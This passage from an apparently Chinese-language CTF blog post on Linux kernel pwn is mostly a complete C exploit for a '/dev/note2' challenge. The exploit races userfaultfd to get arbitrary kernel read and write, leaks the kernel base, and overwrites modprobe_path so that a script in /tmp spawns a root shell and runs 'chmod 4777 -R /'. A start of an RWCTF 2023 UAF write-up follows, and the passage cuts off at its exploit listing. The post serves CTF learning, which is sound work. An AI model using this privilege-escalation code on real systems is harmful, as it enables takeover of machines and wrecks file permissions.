class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ofs_modprobe_path 0x1654b20</span><br><span class="hljs-type">int</span> note2_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-comment">//void * kernel_base = (void *)0xffffffff81000000;</span><br><span class="hljs-type">int</span> cnt;<br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>,edit_t2;<br><span class="hljs-type">size_t</span> key;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> key;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">uint64_t</span> addr;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> idx;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">uint64_t</span> addr;<br>&#125;Note;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> size,<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    Note note=&#123;<br>.size=size,<br>.addr=addr,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF00</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx,<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    Note note=&#123;<br>        .idx=idx,<br>.addr=addr,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF01</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx,<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    Note note=&#123;<br>        .idx=idx,<br>.addr=addr,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF02</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>&#123;<br>    Note note=&#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF03</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> * (*)(<span class="hljs-type">void</span> *))handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">char</span>*page;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    page_size=sysconf(_SC_PAGESIZE);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %d Start!\e[0m\n&quot;</span>,cnt);<br>        <span class="hljs-keyword">switch</span> (cnt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            del(<span class="hljs-number">0</span>);<br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=0</span><br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=1</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            del(<span class="hljs-number">2</span>);<br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=2</span><br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=3</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %d done!\e[0m\n&quot;</span>,cnt);<br>        cnt++;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[+] fault_page = 0x%016lx\e[0m\n&quot;</span>,(<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(buf + <span class="hljs-number">0x1000</span>*cnt));<br>    edit((<span class="hljs-type">uint64_t</span>)args, (<span class="hljs-type">uint64_t</span>)(buf + <span class="hljs-number">0x1000</span>*cnt));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// 0x752f706d742f  u/pmt/</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/qyq&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    note2_fd=open(<span class="hljs-string">&quot;/dev/note2&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(note2_fd==<span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;/dev/note!&quot;</span>);<br>    <br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(buf,<span class="hljs-number">0x2000</span>,fault_handler_thread);<br><br>    <span class="hljs-comment">//---------------AAR----------------------------</span><br>    page=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    add(<span class="hljs-number">0x18</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=0</span><br>    <span class="hljs-type">size_t</span> *fake_note=(<span class="hljs-type">size_t</span>*)page;<br>    fake_note[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    fake_note[<span class="hljs-number">1</span>]=<span class="hljs-number">0x30</span>;<br>    fake_note[<span class="hljs-number">2</span>]=<span class="hljs-number">0xfffffe0000000000</span>;<br>    pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)<span class="hljs-number">0</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<span class="hljs-comment">//must to sleep for a while</span><br>    show(<span class="hljs-number">1</span>,page);<br>    Hexdump(page,<span class="hljs-number">0x20</span>);<br>    key=*(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">8</span>)^<span class="hljs-number">0xffffffff</span>;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page)^=key;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">8</span>)^=key;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">16</span>)^=key;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">24</span>)^=key;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;decryption xor:\n&quot;</span>);<br>    Hexdump(page,<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">size_t</span> kbase=*(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">4</span>)- <span class="hljs-number">0xa08e00</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        /home/note # cat /proc/kallsyms|grep &quot;T startup_64$&quot;</span><br><span class="hljs-comment">        ffffffffa4c00000 T startup_64</span><br><span class="hljs-comment">        /home/note #</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        (page+4)-ffffffffa4c00000=0xa08e00</span><br><span class="hljs-comment">    */</span> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] kernel_base = 0x%016lx\e[0m\n&quot;</span>, kbase);<br>    <span class="hljs-type">size_t</span> modprobe_path=kbase+ofs_modprobe_path;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] modprobe_path = 0x%016lx\e[0m\n&quot;</span>, modprobe_path);<br>    <span class="hljs-comment">//------------------AAW------------------------------</span><br>    fake_note[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    fake_note[<span class="hljs-number">1</span>]=<span class="hljs-number">0x30</span>;<br>    fake_note[<span class="hljs-number">2</span>]=modprobe_path;<br>    add(<span class="hljs-number">0x18</span>,<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=2</span><br>    pthread_create(&amp;edit_t2, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)<span class="hljs-number">2</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<span class="hljs-comment">//must to sleep for a while</span><br><br>    show(<span class="hljs-number">3</span>,page);<br>    Hexdump(page,<span class="hljs-number">0x8</span>);<br>    key = (*(<span class="hljs-type">size_t</span> *)(page)) ^ (<span class="hljs-number">0x6f6d2f6e6962732f</span>);<span class="hljs-comment">// /sbin/mo</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key2 = 0x%016lx\e[0m\n&quot;</span>, key);<br>    <span class="hljs-built_in">strcpy</span>(page,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= key;<br>    edit(<span class="hljs-number">3</span>, page);<br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸææƒè‡³root</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1672215105471.png" alt="1"></p><h2 id="08-modprobe-path">08. modprobe_path</h2><h3 id="2023RWCTF-Digging-into-Kernel-3">2023RWCTF Digging into Kernel 3</h3><p>Real World CTFä½“éªŒèµ›çš„kernel pwnï¼Œå¤ç°ä¸‹</p><h4 id="0x1åˆ†æ-3">0x1åˆ†æ</h4><p>æœ‰ä¸ªuaf,é—®é¢˜åœ¨äºå¦‚ä½•å»æ³„éœ²å†…æ ¸åœ°å€</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684595090620.png" alt="1"></p><h4 id="0x2msg-queue-struct-shm-file-data">0x2msg_queue&amp;struct shm_file_data</h4><p>è¯¦ç»†çš„çœ‹è¿™ä¸ªï¼Œå†™çš„æŒºå¥½</p><p><a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%22%E8%8F%9C%E5%8D%95%E5%A0%86%22">ã€PWN.0x02ã€‘Linux Kernel Pwn IIï¼šå¸¸ç”¨ç»“æ„ä½“é›†åˆ - arttnba3â€™s blog</a></p><h4 id="0x3æ€è·¯-2">0x3æ€è·¯</h4><p>ç”¨msgæ³„éœ²kernelçš„.textåœ°å€</p><blockquote><p>é¦–å…ˆåˆ¶ä½œä¸€ä¸ª0x20å¤§å°çš„uafï¼Œæ¥ç€åˆ›å»ºä¸€ä¸ª0x1018å¤§å°çš„struct msg</p><p>æ­¤æ—¶0x20éƒ¨åˆ†çš„struct msgä¼šè¢«æ”¾å…¥uafä¸­ï¼Œå°†å…¶freeï¼Œåˆ†é…ä¸€ä¸ªstruct shm_file_data</p><p>æ­¤æ—¶åœ¨è¾“å‡ºstruct msgå°±å¯ä»¥æˆåŠŸæ³„éœ²kernelåœ°å€</p><p>ç‰¹åˆ«è¦æ³¨æ„ï¼Œç”±äºå†…æ ¸å…³é—­äº†CONFIG_CHECKPOINT_RESTOREï¼ŒMSG_COPYæ— æ³•ä½¿ç”¨</p><p>å¹¶ä¸”ç”±äºSElinuxçš„å¼€å¯ï¼Œstruct msgçš„securityæŒ‡é’ˆä¸èƒ½è¢«ç ´å</p><p>å› æ­¤è¿›è¡Œuafçš„ç»“æ„ä½“çš„å‰8ä¸ªå­—èŠ‚å¿…é¡»è¦ä¸º0ï¼Œç›®å‰ä¼¼ä¹ä»…æœ‰struct shm_file_dataèƒ½æ»¡è¶³æ¡ä»¶</p></blockquote><p>é»˜è®¤æ˜¯æ²¡å¼€<a href="https://rtfingc.github.io/slub-freelist-hardened">Slub Freelist Hardened </a>,ç”¨doublefreeä»»æ„å†™modprobe_path</p><p>å…³äºä¸ºä»€ä¹ˆæ˜¯0x1018æˆ‘ç”»äº†å¼ å›¾ï¼Œhhh</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3.jpg" alt="3"></p><h4 id="0x4Exp-2">0x4Exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 